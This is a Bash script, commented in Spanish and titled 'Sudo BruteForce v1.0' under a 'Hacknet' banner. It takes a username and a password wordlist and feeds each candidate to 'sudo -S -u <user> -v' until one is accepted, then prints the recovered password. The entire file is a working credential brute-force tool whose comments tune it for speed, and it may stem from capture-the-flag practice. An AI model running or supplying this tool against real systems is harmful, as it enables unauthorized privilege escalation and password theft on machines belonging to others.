#!/bin/bash

# --- Configuración de Hacknet ---
GREEN="\e[1;32m"
RED="\e[1;31m"
BLUE="\e[1;34m"
YELLOW="\e[1;33m"
RESET="\e[0m"

mostrar_ayuda() {
    echo -e "${YELLOW}Uso: $0 <USUARIO> <DICCIONARIO>${RESET}"
    exit 1
}

imprimir_banner() {
    echo -e "${BLUE}"
    echo "    __  __             _    _   _ ______ _______ "
    echo "   / / / /            | |  | \ | |  ____|__   __|"
    echo "  / /_/ /  ____  ____| | _|  \| | |__     | |   "
    echo " / __  /  / _  |/ ___| |/ / . \ |  __|    | |   "
    echo "/ / / /  / (_| | |___|   <| |\  | |____   | |   "
    echo -e "/_/ /_/   \____|\____|_|\_\_| \_|______|  |_|  "
    echo -e "          [ Sudo BruteForce v1.0 ]${RESET}\n"
}

finalizar() {
    echo -e "${RED}\n[!] Ataque interrumpido. Saliendo...${RESET}"
    exit 0
}

trap finalizar SIGINT

usuario=$1
diccionario=$2

if [[ $# -ne 2 ]]; then
    mostrar_ayuda
fi

if [[ ! -f $diccionario ]]; then
    echo -e "${RED}[!] Error: El archivo '$diccionario' no existe.${RESET}"
    exit 1
fi

imprimir_banner
echo -e "${YELLOW}[*] Objetivo:    ${RESET}$usuario"
echo -e "${YELLOW}[*] Diccionario:${RESET} $diccionario"
echo -e "------------------------------------------"

# Optimizamos la lectura usando un descriptor de archivo (3)
exec 3< "$diccionario"

while IFS= read -u 3 -r password; do
    # Limpiamos la línea con \033[K para que sea visualmente más rápido
    echo -ne "${BLUE}[?] Probando: ${RESET}${password:0:25}\033[K\r"

    # Cambiamos 'su' por 'sudo -S -v' para evitar el delay de sesión y usar el modo no interactivo
    if echo "$password" | sudo -S -u "$usuario" -v -p '' > /dev/null 2>&1; then
        echo -e "\n\n${GREEN}[✔] ¡ACCESO CONCEDIDO!${RESET}"
        echo -e "${GREEN}[+] Usuario:    ${RESET}$usuario"
        echo -e "${GREEN}[+] Contraseña: ${RESET}$password"
        exit 0
    fi
done

echo -e "\n${RED}[!] Ataque finalizado. No se encontró coincidencia.${RESET}"
